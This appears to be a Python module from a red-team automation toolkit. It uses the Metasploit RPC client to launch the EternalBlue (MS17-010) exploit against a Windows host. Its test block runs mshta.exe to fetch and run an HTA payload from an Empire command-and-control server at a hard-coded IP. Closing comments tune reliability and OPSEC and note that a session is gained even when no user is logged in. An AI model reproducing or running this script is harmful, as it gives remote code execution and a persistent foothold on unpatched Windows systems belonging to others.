"""
EoP + RCE on remote target (Win7 & w2008R2 64bit All Service Packs)
MSF Module: exploit/windows/smb/ms17_010_eternalblue
Run this & then wait for a MSF/Empire session
"""
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient

def run(client, RHOST, CMD):
    """
    Launch EternalBlue on RHOST running CMD
    \n:param client: MsfRpcClient object
    \n:param RHOST: target IP address or hostname
    \n:param CMD: command to run, see below for more info
    """

    console = client.consoles.console()
    # there's a client.modules.use... but can't get it to work
    # console.write is copy-&-paste friendly; copy from Armitage/msfconsole successful run
    console.write('use exploit/windows/smb/ms17_010_eternalblue')
    console.write('set MaxExploitAttempts 1')
    console.write('set RHOST {0}'.format(RHOST))
    console.write('set PAYLOAD windows/x64/exec')
    console.write('set CMD {0}'.format(CMD))
    console.write('run -j')

# for unit testing of each technique
if __name__ == '__main__':
    client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
    cmd = 'mshta.exe http://empirec2:8000/o.hta'
    run(client, '192.168.181.192', cmd)
"""
The default 'MaxExploitAttempts 3' tend to crash the target (Win7x64 enterprise)
that I tested on. Using PAYLOAD windows/x64/meterpreter/reverse_https also tend to crash target.

So I resorted to windows/x64/exec which is NOT Opsec safe due to
a momentary session-0 appearance at task bar. It's a trade-off since 
it can reliably start an Empire agent w/o crashing the target. 
Interesting to note that even though the output says FAIL, the exec shellcode actually ran

Btw, this will give u a session even the user is NOT login.
Feel free to change this if you have a better approach!
"""